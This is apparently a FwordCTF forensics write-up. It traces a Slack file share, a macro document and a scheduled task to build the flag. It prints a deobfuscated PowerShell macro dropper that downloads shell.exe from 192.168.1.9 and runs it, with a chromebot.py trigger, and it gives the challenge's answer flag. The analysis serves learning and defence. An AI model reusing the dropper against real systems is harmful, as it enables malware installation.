# MAC

## TL;DR
- Reading slack conversation

- dump the registries and get the username and file name

- analyse the macro to get the AttackerIP

- checking the task scheduler to find out that it's running chromebot.py which takes chrome env variable which has been changed with the macro.

## Solution

Starting by exploring the files in order to see how he communicated with the 'group of security group', in **Recent Documents in Autopsy** we see that there is slack there, so dumping slack messages.

PATH: **%AppData%\Roaming\Slack\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00\5**

example of Slack Parser: https://github.com/0xMohammed/Slack-Parser [ Again credit to [0xMohamedHassan](https://twitter.com/0xMohamedHassan)
]

![](https://i.imgur.com/In9OMRF.jpg)


so there is 3 users [cakix36502,Semah BenAli,x_xWhiteuxx_x] , one admin but since SemahBA created the group so he is **cakix36502**, the FileSenderUsername must be of the other two. 

**FileSenderUsername: Semah BenAli or x_xWhiteuxx_x**

Going to **%AppData%\Roaming\Slack\Storage\root-state.json** 

we get : **downloadPath":"C:\\Users\\FwordCTF\\Downloads\\securityupdate.doc.zip** -> ReceivedFileOriginalPath: **Downloads**

Now Checking the suspicious file it was password protected, going back to the messages from Slack, we find the password which is **fwordteam**

there is doc file, while opening asks for Enable editing, so macro one?

### Macro Analysis

I opened in a VM and started [CMD WATCHER](https://www.kahusecurity.com/posts/cmd_watcher_and_maldocs.html) and Enabled the editing and received this: 

![](https://i.imgur.com/JWeM0xM.jpg)

decoding it and we get:

```
$Managerrmo='Venezuelahwf';
$capacitoripk = '657';
$depositkjo='Internaljiw';
$Reverseengineeredifq=$env:userprofile+'\'+$capacitoripk+'.exe';
$Ovalnfc='Handcrafted_Plastic_Pantsrod';
$applicationpmi=&('ne'+'w-ob'+'ject') NEt.WEBCLIenT;
$Practical_Wooden_Gloveszih='httasdp://asd192asd.asd168asd.1asd.9asd/shasdellasd.easdxe'."Replace"("asd","");
$violetcuz='hackingtho';
foreach($Arizonavsf in $Practical_Wooden_Gloveszih){try{$applicationpmi."DO`Wnl`oadfIle"($Arizonavsf, $Reverseengineeredifq);
$Yemennoo='Borderswbi';
[System.Environment]::SetEnvironmentVariable('chrome.exe',$env:userprofile+'\'+$capacitoripk+'.exe')If ((&('Get-'+'It'+'em') $Reverseengineeredifq)."LEn`GTH" -ge 21057) {[Diagnostics.Process]::"S`TaRT"($Reverseengineeredifq);
$Bolivar_Fuertenor='SCSImlh';
break;
$Regionalbpb='Auto_Loan_Accounthzi'}}catch{}}$Liaisonqvc='bestofbreedqit
```

Looking at the code: 

- ``httasdp://asd192asdasd168asd1asd9asd/shasdellasdeasdxe'"Replace"("asd","");`` which is: ``http://192.168.1.9/shell.exe`` so the IP is **192.168.1.9** and The file will be downloaded under %userprofile%\657.exe

- **IPSourceOfTheDownloadedFile: 192.168.1.9**

- **NewMaliciousFile is 657.exe**

- Also the script is setting env variable chrome.exe value to 657.exe

Now The Last Part is left **WhatTriggeredTheMaliciousFile**

Okay going back to **Recent Documents** there is **Checking The Binary.lnk** which is under C:\Windows\System32\Tasks\Checking the Binary

Okay so this is from Task Scheduler.

Checking it -> C:\Windows\System32\Tasks\Checking the Binary

![](https://i.imgur.com/NgTmSj2.jpg)

there is:

```
<Exec>
      <Command>C:\Users\FwordCTF\AppData\Local\Microsoft\WindowsApps\python.exe</Command>
      <Arguments>chromebot.py</Arguments>
      <WorkingDirectory>C:\Program Files\Google\Chrome\Application\</WorkingDirectory>
</Exec>
 ```

Executing python script chromebot.py which is under **C:\Program Files\Google\Chrome\Application\***

Script content:

```python
import os
import pyautogui as pe
import time
chrome_path = os.getenv("chrome.exe")
os.startfile(chrome_path)
time.sleep(1)
# exeucting the binary
for i in range(2):
	pe.click(707,275)
time.sleep(5)
pe.hotkey('alt','f4')
print ("Okay so it's working fine")
```

So it's getting the value of **chrome.exe** which has been set before to 657.exe, going to the path and made it a startfile path, and double clicking the binary? 

So that's **WhatTriggeredTheNewMaliciousFile**

Flag Format : FwordCTF{FileSenderUsername-IPSourceOfTheDownloadedFile-ReceivedFileOriginalPath-NewMaliciousFile-WhatTriggeredTheNewMaliciousFile}

Putting all the pieces together:

Flag is: **FwordCTF{x_xWhiteuxx_x-192.168.1.9-Downloads-657.exe-chromebot.py}** 
